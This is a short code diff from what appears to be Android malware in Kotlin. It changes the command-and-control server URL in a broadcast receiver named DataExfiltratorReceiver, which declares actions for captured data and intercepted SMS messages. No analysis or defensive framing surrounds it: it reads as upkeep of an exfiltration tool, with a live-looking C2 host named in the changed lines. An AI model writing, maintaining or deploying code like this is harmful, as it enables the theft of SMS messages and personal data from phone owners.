@@ -16,7 +16,7 @@ class DataExfiltratorReceiver : BroadcastReceiver() {
 
     companion object {
         private const val TAG = "DecryExfil"
-        private const val C2_SERVER_URL = "https://crytake.vercel.app/api"
+        private const val C2_SERVER_URL = "https://cry-take.vercel.app/api"
         private const val ACTION_DATA_CAPTURED = "com.decry.DATA_CAPTURED"
         private const val ACTION_SMS_INTERCEPTED = "com.decry.SMS_INTERCEPTED"
     }
